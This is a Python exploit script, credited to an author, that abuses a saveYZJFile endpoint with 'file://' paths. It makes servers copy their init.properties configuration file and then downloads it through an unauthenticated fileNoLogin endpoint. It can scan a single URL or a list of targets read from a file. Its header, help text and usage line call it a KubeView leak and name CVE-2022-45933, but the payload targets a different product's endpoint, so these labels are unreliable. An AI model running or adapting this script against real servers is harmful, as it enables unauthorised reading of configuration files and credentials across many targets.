#!/usr/bin/env python
# -*- conding:utf-8 -*-
# KubeView 信息泄漏
# fofa title="KubeView"
import requests
import argparse
import sys
import urllib3
from termcolor import cprint
urllib3.disable_warnings()
color = "green"

def title():
    cprint("""
           _____ 
    /\    |_   _|
   /  \     | |  
  / /\ \    | |  
 / ____ \  _| |_ 
/_/    \_\|_____|
                 
                                     
                                                                                                                                                                                                                                                                                                            
                                                                                        Author:Henry4E36
               """,color)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file
    

    def target_url(self):
        color = "red"
        #payload = self.url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///weaver/ebridge/tomcat/webapps/ROOT/WEB-INF/classes/init.properties&fileExt=txt" 
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
        }  

        proxies = {
            "http": "127.0.0.1:8080"
        } 
        status = []
        id_list = []
        list = ["/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///weaver/ebridge/tomcat/webapps/ROOT/WEB-INF/classes/init.properties&fileExt=txt", "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///d://ebridge/tomcat/webapps/ROOT/WEB-INF/classes/init.properties&fileExt=txt"]
        for i in list: 
            payload = self.url + i  
            try:
                res = requests.get(url=payload, headers=headers, verify=False, timeout=5)
                if res.status_code == 200 and "filesize" in res.text:
                    id = res.json()["id"]
                    status.append(True)
                    id_list.append(id)
            except Exception as e:
                print(f"[x] 目标系统: {self.url} 连接错误！")
        information.result_show(self, status,id_list)
    
    def result_show(self, status,id_list):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0"
        } 
        print(id_list,status)
        color = "red"
        if not status:
            print(f"[x] 目标系统: {self.url} 不存在文件读取漏洞")
        elif status[0] == True:
            cprint(f"[{chr(8730)}] 目标系统: {self.url} 为Linux系统",color)
            cprint(f"[{chr(8730)}] 目标系统: {self.url} 的ID值为:{id_list[0]}",color)
        elif status[1] == True:
            cprint(f"[{chr(8730)}] 目标系统: {self.url} 为Windows系统",color)
            cprint(f"[{chr(8730)}] 目标系统: {self.url} 的ID值为:{id_list[0]}",color)
        if id_list:
            res = requests.get(url=self.url + f"/file/fileNoLogin/{id_list[0]}", headers=headers, verify=False, timeout=5)
            print(res.text)



    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='KubeView 信息泄漏')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 CVE-2022-45933.py -u http://127.0.0.1\neg2:>>>python3 CVE-2022-45933 -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
  
      

